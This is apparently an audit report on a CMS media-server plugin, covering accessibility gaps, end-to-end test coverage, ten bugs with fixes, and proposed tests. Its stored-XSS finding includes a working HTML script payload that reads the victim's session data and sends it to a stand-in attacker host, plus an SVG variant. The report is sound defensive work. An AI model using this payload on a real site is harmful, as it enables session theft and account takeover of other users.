`media-server` renders no UI, so most of WCAG applies to its consumers. What it
**does** own is the data model that decides whether accessible content is
expressible at all — Section 508 **504.2 (authoring tools must produce
conformant content)** is a schema question before it is a UI question.

**Baseline:** ❌ — there is no a11y suite for this unit and none is possible for
a JSON API; the relevant assertions belong in the consumers.

#### ♿ A11Y-media-server-01 — The asset model can store alt text, but not a caption or a long description
**WCAG:** 1.1.1 Non-text Content (A) · **508:** 504.2 · **Verdict: Partially Supports**
**Location:** `packages/media/server/src/lib/infrastructure/schema/media-asset.ts:62`
`alt: text('alt')` exists and is surfaced end-to-end (`UpdateAssetDto.alt`,
`Asset.setAlt`, the Insights `alt` coverage aggregate). So the answer to "does the
asset model even have an alt-text field?" is **yes** — this is not the schema-level
Does Not Support it could have been.
What it does **not** have: a `caption`, a `longDescription`, or any per-usage
override. Alt is stored **per asset**, so the same logo reused as a decorative
flourish in one entry and as the sole content of a hero in another carries one
description in both places. The rich-text editor works around this by storing alt
on the *node* (`wysiwyg/admin`'s `ResizableImage.alt`), but a `field.media` value
is a bare uuid with no room for per-usage alt — see `♿ A11Y-media-admin-02`.
**Keyboard / SR experience:** a screen-reader user meeting the same asset twice
hears the same description regardless of its role in the page.
**Remediation:** add a nullable `caption` / `long_description` to `media_asset`, and
allow a `field.media` value to be an object `{ id, alt? }` so alt can be overridden
per usage.

#### ♿ A11Y-media-server-02 — No captions/subtitles track can be associated with a video asset
**WCAG:** 1.2.2 Captions (Prerecorded) (A), 1.2.3 Audio Description or Media Alternative (A) · **508:** 503.4, 504.2 · **Verdict: Does Not Support**
**Location:** `packages/media/server/src/lib/infrastructure/schema/media-asset.ts:40-75`
The row carries `kind: 'video'`, `duration`, `width`, `height` — and nothing that
can name a caption file. `MediaKind` has no `caption`/`track` category
(`value-objects/media-kind.ts:2-7`) and there is no relation from one asset to
another. A WebVTT file uploaded as a second asset is `kind: 'document'` with no
link back to the video it belongs to, so nothing downstream can find it.
**Repro:** upload `talk.mp4`, then `talk.vtt`; `GET /api/media/assets` returns two
unrelated rows. The `MEDIA_ASSET_RESOLVER` ref for the video has no `tracks` key.
**Keyboard / SR experience:** a deaf or hard-of-hearing user reading published
content gets a `<video controls>` with no caption track available at any layer,
because the CMS cannot represent one. Combined with `♿ A11Y-wysiwyg-admin-04`
(the editor emits a bare `<video controls>`) this makes video published through
Ortha structurally non-conformant.
**Remediation:** add a self-referencing `caption_asset_id` (or a `tracks` jsonb of
`{ kind, srclang, label, assetId }`) to `media_asset`, expose it on `AssetView`, and
carry it into the resolver ref so both the editor and the public API can emit
`<track>`.

#### ♿ A11Y-media-server-03 — Alt text is never required, and nothing at the API layer prompts for it
**WCAG:** 1.1.1 Non-text Content (A) · **508:** 504.3 · **Verdict: Partially Supports**
**Location:** `packages/media/server/src/lib/application/dto/upload-asset.dto.ts:157`
The upload DTO's only field is `folderId`. An image can be created with `alt: null`
and stays that way forever; nothing in `UploadAssetUseCase` warns, blocks, or flags.
The **only** thing pushing back is the read-only Insights aggregate
(`/api/insights/media/alt`), which counts the gap after the fact — and correctly
refuses to count a blank string as covered (AGENTS "A blank `alt` does not count as
covered"). 504.3 asks an authoring tool to *prompt*; the prompt exists only in the
admin (`♿ A11Y-media-admin-01`) and the editor, not in the API a token uses.
**Remediation:** accept an optional `alt` on `UploadAssetDto` and on
`POST /api/v1/media/assets`, so a token-driven import can supply it at creation
rather than needing a second `PATCH` nobody makes.

#### ♿ A11Y-media-server-04 — `Content-Disposition: inline` with an unvalidated type also defeats AT-safe delivery
**WCAG:** 4.1.1-adjacent / not a direct SC · **508:** 502.2 (interoperability with AT) · **Verdict: Partially Supports**
**Location:** `packages/media/server/src/lib/http/controllers/download-asset.controller.ts:62-66`
The stored (client-declared) `mimeType` is echoed as `Content-Type`. When it is
wrong, assistive technology and the browser both mis-handle the resource — a PDF
served as `image/png` will not open in a screen-reader-aware PDF viewer. This is
the accessibility face of `🐞 BUG-media-server-01`; fixing the security bug
(sniff or allowlist the type) fixes this too. Cross-referenced, not double-filed.

## 5. E2E Coverage Map

| Feature | Spec | Asserts | Verdict |
| --- | --- | --- | --- |
| F1 folders list | `apps/server-e2e/src/server/media/media-folders.spec.ts:63` | create → list shows the folder with `rootAssetCount` | ✅ E2E |
| F2 create folder | `media-folders.spec.ts:63` | `201` + id; parent nesting via the cascade test at `:112` | ✅ E2E |
| F3 rename folder | `media-folders.spec.ts:83` | name changes | ⚠️ PARTIAL — no length/blank/foreign-workspace case |
| F4 folder cascade | `media-folders.spec.ts:112`, `:157` | subtree + assets removed; **cascade stays inside the workspace** | ✅ E2E |
| F4 empty folder delete | `media-folders.spec.ts:99` | `204` | ✅ E2E |
| F5 upload | `media-assets.spec.ts:78`, `:112` | row persisted, folder honoured, uploader name resolved (`:96`) | ⚠️ PARTIAL — **every** upload declares `contentType: 'image/png'` (`media-assets.spec.ts:74`); no hostile type is ever sent |
| F6 provider routing | — | — | ❌ NONE |
| F7 derivatives | `media-assets.spec.ts:230`, `:252`, `:291` | thumb+preview on a large image, thumb-only on a small one, none for a non-image | ✅ E2E |
| F8 reclamation | — | — | ❌ NONE — no test asserts the disk is clean after a rolled-back upload |
| F9 list assets | `media-assets.spec.ts:141` | a folder page and the root | ⚠️ PARTIAL — no `search`/`kind`/`sort`/paging boundary, no malformed-param case |
| F10 raw download | `media-assets.spec.ts:130`, `:410`, `:436` | bytes round-trip; **member of the owning workspace wins over the header**; non-member gets `404` | ✅ E2E |
| F11 variant fallback | `media-assets.spec.ts:260`, `:275` | missing variant and bogus `?variant=` both serve the original | ✅ E2E |
| F12 patch asset | `media-assets.spec.ts:151` | rename + move | ⚠️ PARTIAL — tags normalisation, alt trimming, `folderId: null`, and the `FileName` rejections are untested |
| F13 duplicate | `media-assets.spec.ts:169`, `:306` | copy created; derivatives carried onto the copy | ✅ E2E |
| F14 bulk delete | `media-assets.spec.ts:180` | rows removed, count returned | ⚠️ PARTIAL — no DTO-bound case, no cross-workspace id in the batch |
| F15 outbox | — | — | ❌ NONE |
| F16 token upload | — | — | ❌ NONE |
| F17 token download | — | — | ❌ NONE |
| F18 size cap / 413 | — | — | ❌ NONE |
| F19 media resolver | `apps/server-e2e/src/server/content/content-media-fields.spec.ts` | media-field existence + `accept` enforcement, refs | ✅ E2E |
| F20–F22 insights | `apps/server-e2e/src/server/insights/media-insights.spec.ts:83,107,122,134,154,163,174,186,207,222` | per-kind grouping, numeric bytes, empty workspace, workspace scoping, blank-alt rule, non-image exclusion, bucketing, window clamp | ✅ E2E |
| F23 shared tools | `apps/server-e2e/src/server/mcp/mcp.spec.ts`, `.../copilot/copilot-read-catalogue.spec.ts` | which surface sees which tool | ⚠️ PARTIAL — the `downloadPath` divergence per surface is not asserted |
| F24 propose tools | `apps/server-e2e/src/server/copilot/copilot-media-files.spec.ts` | the create-file path | ⚠️ PARTIAL |
| F25 attachment resolver | `copilot-media-files.spec.ts` | foreign assets omitted | ✅ E2E |
| F26 permissions | `media-folders.spec.ts:202,217`, `media-assets.spec.ts:356` | viewer denied create, allowed read; viewer denied upload | ⚠️ PARTIAL — `contributor` never tested; delete routes never permission-tested |
| F27 OriginGuard | `media-folders.spec.ts:229`, `:238` | bad origin `403`, configured origin allowed | ⚠️ PARTIAL — only on folder create |
| a11y | — | — | ❌ NONE (correctly — no UI) |

**Coverage tally:** `27 features · 11 ✅ · 9 ⚠️ · 7 ❌`

## 6. 🐞 Potential Bugs

### 🐞 BUG-media-server-01 — Uploaded files are served inline with a client-declared MIME type and no `nosniff`, making the Media Library a stored-XSS vector on the admin origin · Severity: Critical · 🔒

**Location:** `packages/media/server/src/lib/http/controllers/download-asset.controller.ts:61-67`, `packages/media/server/src/lib/application/use-cases/upload-asset.use-case.ts:89`, `packages/media/server/src/lib/domain/value-objects/media-kind.ts:36-42`
**Category:** permission-bypass / stored XSS

**What the code does:**
```typescript
const stream = await this.query.open(location);
return new StreamableFile(stream, {
    type: location.mimeType,
    disposition: `inline; filename="${encodeURIComponent(location.name)}"`,
    length: location.size
});
```
`location.mimeType` is `media_asset.mime_type`, which is `file.mimetype` from
multer — i.e. the `Content-Type` the client wrote on its own multipart part
(`upload-asset.controller.ts:83`). There is **no allowlist, no denylist, and no
magic-byte sniffing** anywhere in the upload path: `MediaKind.classify` only maps
the string to a coarse bucket and files anything unrecognised as `document`.
`grep -rn "nosniff\|helmet\|contentSecurityPolicy" packages apps` returns **zero
matches**, so no `X-Content-Type-Options` and no CSP is set globally either.

**Why it is wrong:** the route serves attacker-controlled bytes, with an
attacker-controlled `Content-Type`, `inline`, from the **same origin as the admin
SPA and its session cookie**. The plugin's own AGENTS.md treats this route's
authorization carefully ("Any new route whose URL the browser loads directly needs
this treatment") but says nothing about what it serves. `.cursor/BUGBOT.md`'s
"permission gating only in the UI … the server guard is the real boundary" is the
same class of reasoning applied to the wrong axis: the guard is right, the payload
is not.

**Repro:**
1. As a `contributor` (holds `media:create`, the lowest role that can upload):
   `curl -b j -X POST localhost:3000/api/media/assets -H "X-Workspace-Id: $WS" -H 'Origin: http://localhost:4200' -F 'file=@xss.html;type=text/html'`
   where `xss.html` is `<script>fetch('/api/auth/me').then(r=>r.json()).then(d=>fetch('//evil.test/?'+btoa(JSON.stringify(d))))</script>`.
2. Note the returned `id`. The asset appears in the library as a `document`.
3. Send any workspace member the link `http://localhost:4200/api/media/assets/<id>/raw`
   (or embed it in a rich-text body as an `<iframe>`/link — `mediaSrc` allows
   same-origin paths).
→ Observed: the browser renders the HTML and executes the script under the admin's
origin, with the victim's session cookie attached to every subsequent request.
→ Expected: `Content-Disposition: attachment` for anything outside a small
allowlist, `X-Content-Type-Options: nosniff` on every response, and the stored
`mime_type` derived from sniffed bytes rather than the client's claim.
The same works with `;type=image/svg+xml` and an SVG carrying `<script>`, which
additionally passes as an `image` and renders in `<img>`-adjacent contexts.

**Blast radius:** any user who can upload (contributor and above, plus any
`full`-scope API token via `/api/v1/media/assets`) can execute script in the
browser of any other workspace member who opens the link, including an admin —
full privilege escalation within the CMS. Every deployment is affected; no config
turns it off.

**Suggested fix:** sniff the type from the leading bytes (e.g. `file-type`) and
persist the sniffed value, not the client's; serve everything outside a strict
render-safe allowlist (`image/png|jpeg|gif|webp`, `video/mp4`, `audio/*`,
`application/pdf`) as `Content-Disposition: attachment`; always send
`X-Content-Type-Options: nosniff`; and refuse or force-download `image/svg+xml`.

---

### 🐞 BUG-media-server-02 — `GET /api/media/assets/:id/raw` grants any member of the owning workspace the bytes regardless of which workspace the request claims · Severity: Medium · 🔒

**Location:** `packages/media/server/src/lib/http/controllers/download-asset.controller.ts:53-59`
**Category:** tenant-leak (by design, but the boundary is weaker than the rest of the plugin's)

**What the code does:**
```typescript
const location = await this.query.locate(id, variant);
if (!location || !(await this.members.isMember(user.id, location.workspaceId))) {
    throw new NotFoundException();
}
```
The workspace is derived from the row and checked against **membership only**. The
caller's active workspace (`X-Workspace-Id`) is not consulted, and neither is any
per-workspace role: `PermissionsGuard` evaluates `media:read` against the user's
*global* role, not their grants in `location.workspaceId`.

**Why it is wrong:** every other media route makes `X-Workspace-Id` binding, and
the `/v1` sibling explicitly does so — `public-media.controller.ts:173` comments
"reading across that line would make `X-Workspace-Id` advisory", then enforces
`location.workspaceId !== workspaceId`. The session route does the opposite. The
e2e at `media-assets.spec.ts:410` *pins the weaker behaviour as correct* ("streams
to a member of the owning workspace, ignoring the header"). So a user who is a
member of workspaces A and B, but whose UI is scoped to A, can fetch B's bytes by
id with no workspace switch — and a role model that ever becomes per-workspace
would silently not apply here.

**Repro:**
1. Admin is a member of `Workspace` and `Other`.
2. Upload `x.png` into `Other`; note its id.
3. `curl -b j -H "X-Workspace-Id: $WORKSPACE" localhost:3000/api/media/assets/$ID/raw`
→ Observed: `200` with the bytes of an asset in `Other`.
→ Expected (arguably): `404`, matching `/api/v1/media/assets/:id/raw`.

**Blast radius:** limited today — the reader is already a member of the owning
workspace, so no data crosses a tenancy line the user has not already crossed. It
becomes a real leak the moment permissions become per-workspace (a viewer in B who
is an admin in A would still read B's assets).

**Suggested fix:** decide explicitly. Either document the divergence in AGENTS.md
beside the `/v1` paragraph that contradicts it, or additionally require
`location.workspaceId === currentWorkspaceId` when the header is present, keeping
the header-less `<img src>` case working.

---

### 🐞 BUG-media-server-03 — Unvalidated `?folderId=` / `?kind=` on the asset list produce a 500 instead of a 400 · Severity: Medium

**Location:** `packages/media/server/src/lib/http/controllers/list-assets.controller.ts:34-55`, `packages/media/server/src/lib/infrastructure/queries/list-assets.query.ts:50-61`
**Category:** correctness

**What the code does:**
```typescript
@Query('folderId') folderId?: string,
@Query('kind') kind?: string,
…
folderId: folderId ?? null,
kind,
```
and in the query:
```typescript
params.folderId ? eq(mediaAsset.folderId, params.folderId) : isNull(...)
…
eq(mediaAsset.kind, params.kind as MediaKindColumn)
```
Neither string is validated. `folderId` is bound to a `uuid` column and `kind` to
the `media_kind` enum, so Postgres raises `invalid input syntax for type uuid` /
`invalid input value for enum media_kind` and Nest maps the unrecognised error to
a `500`.

**Why it is wrong:** `.cursor/BUGBOT.md` — "Dropping filters/validation … Re-verify
the DTO (`class-validator`) still constrains input." Every sibling route in this
plugin validates its params (`ParseUUIDPipe` on `:id`, `@IsUUID` on
`UploadAssetDto.folderId`); the list route is the one that does not. A 500 is also
a monitoring lie — a malformed client request pages the on-call.

**Repro:**
1. `curl -b j -H "X-Workspace-Id: $WS" 'localhost:3000/api/media/assets?folderId=abc'`
2. `curl -b j -H "X-Workspace-Id: $WS" 'localhost:3000/api/media/assets?kind=exe'`
→ Observed: `500 Internal Server Error`, a Postgres error in the logs.
→ Expected: `400`, naming the offending parameter.

**Blast radius:** any `media:read` holder can trigger a 500 at will; no data is
exposed. It is also reachable from the admin if a stale folder id survives a
deletion in a bookmarked URL.

**Suggested fix:** give the route a query DTO with `@IsOptional() @IsUUID()` on
`folderId` and `@IsIn([...mediaKind.enumValues, 'all'])` on `kind`.

---

### 🐞 BUG-media-server-04 — A partially-written blob is left on disk when `put` itself fails · Severity: Medium

**Location:** `packages/media/server/src/lib/application/use-cases/upload-asset.use-case.ts:113-179`
**Category:** data-loss / resource leak

**What the code does:**
```typescript
const written: string[] = [];
try {
    const original = await provider.put({ … });
    written.push(original.storageKey);
```
`written` is appended to **after** `put` resolves. If `put` rejects part-way — a
disk-full `ENOSPC`, a permissions error, an aborted source stream — the key was
never recorded, so the `catch` at line 170 reclaims nothing, and
`provider-local`'s `pipeline` leaves the partially-written file at `target`
(`packages/media/provider-local/src/lib/local-storage-provider.ts:67`; `pipeline`
destroys streams, it does not unlink).

**Why it is wrong:** the class JSDoc claims "Every blob written (original +
derivatives) is reclaimed if the transaction rolls back, so a failed upload leaves
nothing behind" (`upload-asset.use-case.ts:61-62`). That holds only for a
*successful* `put` followed by a later failure. AGENTS.md repeats the claim.

**Repro:**
1. `chmod 000` the workspace directory under `MEDIA_LOCAL_ROOT` mid-upload, or fill
   the volume, then `POST /api/media/assets` with a large file.
2. Restore permissions and `ls -R $MEDIA_LOCAL_ROOT/$WS/`.
→ Observed: a directory `<assetId>/` containing a truncated file, with no
`media_asset` row anywhere pointing at it.
→ Expected: nothing left behind, per the documented contract.

**Blast radius:** silent, unbounded disk growth on any deployment where uploads
sometimes fail. Invisible to every list query (the row is what the UI reads), so it
is only ever found by `du`.

**Suggested fix:** have `put` clean up its own partial target on failure (a
`try/catch` around the `pipeline` that `rm`s the file), and/or compute the key
before the write and push it into `written` before calling `put`.

---

### 🐞 BUG-media-server-05 — `?search=` treats `%` and `_` as wildcards, unlike every other search in the codebase · Severity: Low

**Location:** `packages/media/server/src/lib/infrastructure/queries/list-assets.query.ts:62-65`
**Category:** correctness

**What the code does:**
```typescript
const search = params.search?.trim();
if (search) {
    conditions.push(ilike(mediaAsset.name, `%${search}%`));
}
```
The user's string is interpolated into the LIKE pattern with no escaping.

**Why it is wrong:** content-server extracted `buildSearchPredicate` into
`entries/infrastructure/queries/entry-search.ts` specifically so its two callers
"can't drift on the escaping" (content-server AGENTS.md, _Search + filter_). Media
re-implements the ILIKE and drops the escaping, so `?search=_` matches every
one-or-more-character name and `?search=100%` never matches a file literally named
`100%.png`. The tool surface inherits it (`media_assets_search` wraps
`ListAssetsQuery`), so a model searching for `report_final` gets fuzzy matches.

**Repro:** upload `a.png` and `b.png`, then `GET /api/media/assets?search=_`.
→ Observed: both rows. → Expected: neither (no name contains a literal underscore).

**Blast radius:** wrong search results in the library and for agent tools. No
security impact — drizzle parameterises the value, so this is not SQL injection.

**Suggested fix:** escape `%`, `_` and `\` in `search` before building the pattern,
or reuse content-server's exported search helper.

---

### 🐞 BUG-media-server-06 — Uploads are fully buffered in memory despite the port documenting a stream · Severity: Low

**Location:** `packages/media/server/src/lib/http/controllers/upload-asset.controller.ts:85`, `packages/media/server/src/lib/http/controllers/public-media.controller.ts:137`, `packages/media/server/src/lib/domain/storage-provider.ts:20`
**Category:** perf

**What the code does:** `FileInterceptor('file', { limits: { fileSize: MAX_UPLOAD_BYTES } })`
with no `storage` option uses multer's **memory** storage, so `file.buffer` is the
whole file; the controller then wraps it as `body: Readable.from(file.buffer)`.

**Why it is wrong:** `PutObject.body` is documented as "a stream so large files
never buffer fully in memory", and `provider-local`'s AGENTS.md repeats "large
files never buffer fully in memory". At the default 50 MB cap, `UPLOAD_CONCURRENCY`
parallel uploads from the admin (plus any API clients) is `N × 50 MB` of resident
heap — and for images the bytes are collected a *second* time
(`upload-asset.use-case.ts:44-50, 109`), doubling it.

**Repro:** upload eight 45 MB files concurrently and watch RSS.
→ Observed: heap grows by roughly `2 × 8 × 45 MB` for image kinds.
→ Expected, per the docs: bounded by the stream's high-water mark.

**Blast radius:** memory pressure / OOM on a small container under concurrent
upload; reachable by anyone holding `media:create`.

**Suggested fix:** either use multer's disk storage and stream the temp file, or
correct the port's and both AGENTS.md's claims to say the HTTP path buffers.

---

### 🐞 BUG-media-server-07 — The upload cap is read from `process.env` at module load, so `config.plugins.media.maxUploadBytes` is inert · Severity: Low

**Location:** `packages/media/server/src/lib/http/controllers/upload-asset.controller.ts:37-38`, `packages/media/server/src/lib/http/controllers/public-media.controller.ts:42-43`, `packages/media/server/src/lib/types/media-config.ts` (`maxUploadBytes`)
**Category:** correctness

**What the code does:**
```typescript
const MAX_UPLOAD_BYTES = Number(process.env['MEDIA_MAX_UPLOAD_BYTES']) || 52_428_800;
```
evaluated once when the module is first imported, in **two** files.

**Why it is wrong:** `MediaPluginConfig.maxUploadBytes` is a documented,
host-supplied setting and is bound into DI, but nothing reads it for the route
limit. The comment acknowledges the workaround ("the interceptor can't read DI
config") while claiming the two "stay in lockstep" — they only do if the host
happens to derive its config from the same env var. A host that sets
`maxUploadBytes: 5_000_000` in `ortha.config.ts` without exporting the env gets
50 MB. `Number('')` and `Number('abc')` are both falsy/NaN, so a typo'd env
silently reverts to 50 MB rather than failing boot.

**Repro:** set `maxUploadBytes: 1024` in `apps/server/ortha.config.ts` with no
`MEDIA_MAX_UPLOAD_BYTES`, restart, upload a 2 MB file → `201`.
→ Expected: `413`.

**Blast radius:** a deployment believing it has a tight cap does not.

**Suggested fix:** resolve the limit in a `FileInterceptor` factory built from DI
(`MulterModule.registerAsync` or a custom interceptor reading the config token),
and fail boot when the env is set to a non-number.

---

### 🐞 BUG-media-server-08 — `CreateFolderDto` documents a sibling-name uniqueness rule that does not exist · Severity: Low

**Location:** `packages/media/server/src/lib/application/dto/create-folder.dto.ts:12`, `packages/media/server/src/lib/infrastructure/schema/media-folder.ts:99-101`
**Category:** correctness (documentation drift)

**What the code does:** the DTO's JSDoc reads `/** Folder name, unique among its
siblings in the workspace. */`, and the property is published in the OpenAPI
document. The table declares only `index('media_folder_ws_parent_idx')` — an index,
not a unique constraint — and `CreateFolderUseCase` performs no name check.

**Why it is wrong:** the generated API reference states a guarantee the server does
not make, so a client written against the docs will not handle two `Brand` folders
under one parent. The admin's folder tree renders both, indistinguishably.

**Repro:** `POST /api/media/folders {"name":"Brand"}` twice → two `201`s, two
folders named `Brand` at the root.

**Blast radius:** confusing UI, wrong client assumptions. No data loss.

**Suggested fix:** either add `uniqueIndex(workspaceId, parentId, name)` plus a
`409` mapping, or delete the false clause from the JSDoc.

---

### 🐞 BUG-media-server-09 — A folder cascade loads every descendant asset and fires one unbounded `Promise.all` of blob deletes · Severity: Low

**Location:** `packages/media/server/src/lib/application/use-cases/delete-folder.use-case.ts:119-129, 144-149`
**Category:** perf

**What the code does:**
```typescript
const assets = await this.assets.findManyByFolderIds(tree.map(e => e.id), workspaceId);
for (const asset of assets) { asset.markDeleted(); await this.assets.delete(asset); … }
…
await Promise.all(assets.map((asset) => reclaimAssetBlobs(this.registry, asset)));
```
Every asset in the subtree is hydrated into an `Asset` aggregate, each gets its own
`DELETE` round-trip and its own outbox append inside one transaction, and then
every blob (original + each derivative) is removed concurrently with no limit.

**Why it is wrong:** the bulk asset delete is bounded at 100 ids by
`DeleteAssetsDto`; the folder cascade has no bound at all and reaches the same
code. On a folder holding 20 000 images that is 20 000 sequential deletes plus
20 000 outbox rows in a single long transaction (blocking the `FOR UPDATE` locks
the whole time), then ~60 000 concurrent `fs.rm` calls.

**Repro:** seed 20 000 assets under one folder and `DELETE /api/media/folders/<id>`.
→ Observed: a multi-minute transaction, then a file-descriptor spike.
→ Expected: chunked deletes and a concurrency-limited reclaim.

**Blast radius:** availability. Requires `media:delete`.

**Suggested fix:** delete rows set-wise (`inArray`) rather than per aggregate, emit
one summarising event, and cap the reclaim fan-out (e.g. batches of 32).

---

### 🐞 BUG-media-server-10 — `StorageRegistry.get` uses a bare index where `has` uses `hasOwnProperty` · Severity: Low

**Location:** `packages/media/server/src/lib/infrastructure/storage-registry.ts:15-24`
**Category:** correctness

**What the code does:**
```typescript
get(name: string): StorageProvider {
    const provider = providers[name];
    if (!provider) throw new Error(`Unknown storage provider: ${name}`);
    return provider;
},
has(name: string): boolean {
    return Object.prototype.hasOwnProperty.call(providers, name);
},
```
`get('constructor')` returns `Object.prototype.constructor` — truthy, so the guard
passes — and the caller then invokes `.put`, which is `undefined`.

**Why it is wrong:** the same class of bug the plugin already fixed one file over:
`download-asset.query.ts:70` deliberately uses `Object.hasOwn` on `variants`
because "a bare index would take `?variant=toString` for a stored derivative and
hand the provider an `undefined` key". `get` and `has` disagreeing about what
membership means is exactly how a future caller trusts `has` and is surprised by
`get`.

**Repro:** not reachable from HTTP today — `name` comes from the stored
`storage_provider` column or the host's resolver, never from a request. Reachable
by a host whose custom `StorageResolver` returns a computed string.
→ Observed (unit-level): `buildRegistry({}).get('toString')` returns a function
instead of throwing.

**Blast radius:** none in the shipped host; a latent trap for a custom resolver.

**Suggested fix:** `Object.hasOwn(providers, name)` in `get`, or build the registry
over a `Map`.

---

**Tally:** 10 🐞 — 1 Critical (🔒), 1 Medium 🔒, 2 Medium, 6 Low.
**♿ tally:** 4 — 0 Supports · 3 Partially Supports · 1 Does Not Support · 0 Not Applicable.

**Checked and cleared** (read, found correct): the folder-cascade workspace filter
in both branches of the recursive CTE and its converging re-walk; `FOR SHARE` on
upload/move destinations vs `FOR UPDATE` on the delete; `Object.hasOwn` on
`variants`; the `/v1` raw route's `location.workspaceId !== workspaceId` check; the
404-not-403 shape on cross-tenant reads; `Asset.retag`/`setAlt` normalisation;
`FileName`'s separator rejection; the absence of any folder-move path (so no cycle
is constructible); `DeleteAssetsDto`'s bounds; and `reclaimAssetBlobs` covering
derivatives via `Asset.storageKeys`.

## 7. Recommended E2E Tests

| Priority | Harness | Proposed spec | Asserts | Closes |
| --- | --- | --- | --- | --- |
| 1 | `apps/server-e2e` testcontainer + supertest | `src/server/media/media-upload-safety.spec.ts` | uploading `.html`/`.svg`/a polyglot with a hostile `contentType` stores a **sniffed** type; `GET …/raw` responds with `X-Content-Type-Options: nosniff` and `Content-Disposition: attachment` for anything outside the render-safe allowlist | 🐞 BUG-media-server-01, ♿ A11Y-media-server-04, F5 ⚠️ |
| 2 | `apps/server-e2e` | `src/server/media/public-media-api.spec.ts` | `/v1` upload with `full` vs `read` scope (201/403); `/v1` raw returns `404` for an asset in another workspace **inside the same token bucket**; `uploaded_by` is the minting user; no-header behaviour for single- vs multi-workspace tokens | F16 ❌, F17 ❌, EC-35 |
| 3 | `apps/server-e2e` | `src/server/media/media-assets-validation.spec.ts` | `?folderId=abc` and `?kind=exe` return `400` not `500`; `?search=_` matches nothing; `pageSize` clamp at 100; `page` beyond the end returns an empty page with an honest `total` | 🐞 BUG-media-server-03, 🐞 BUG-media-server-05, F9 ⚠️ |
| 4 | `apps/server-e2e` | extend `src/server/media/media-assets.spec.ts` | a `413` when the file crosses `MEDIA_MAX_UPLOAD_BYTES` (set per-suite, like the login-throttle suite does); exactly-at-limit succeeds | F18 ❌ |
| 5 | `apps/server-e2e` | `src/server/media/media-upload-reclaim.spec.ts` | an upload into a foreign-workspace folder rolls back **and** leaves no file under the local provider's root; a failed `put` leaves nothing either (inject a throwing provider via the test host) | 🐞 BUG-media-server-04, F8 ❌ |
| 6 | `apps/server-e2e` | `src/server/media/media-permissions.spec.ts` | full role × route matrix for `admin`/`contributor`/`viewer`/unauthenticated/non-member, asserting `403` vs `404` per route; `OriginGuard` on every state-changing route, not just folder create | F26 ⚠️, F27 ⚠️, EC-31 |
| 7 | package unit (`*.spec.ts` beside the source) | `src/lib/infrastructure/storage-registry.spec.ts` | `get`/`has` agree for prototype keys; an unknown name throws | 🐞 BUG-media-server-10 |
| 8 | `apps/server-e2e` | `src/server/media/media-outbox.spec.ts` | each mutation writes exactly the expected `media.*` rows in the same transaction; a rolled-back write writes none | F15 ❌ |
| 9 | `apps/server-e2e` | extend `src/server/mcp/mcp.spec.ts` | `downloadPath` is `/api/v1/media/...` over MCP and `/media/...` over the copilot, for the same asset | F23 ⚠️ |
| 10 | `apps/server-e2e` | extend `media-assets.spec.ts` | PATCH normalisation cases: tags trimmed/de-duplicated, blank alt → `null`, `folderId: null` → root, `a/b.png` → `400` | F12 ⚠️ |
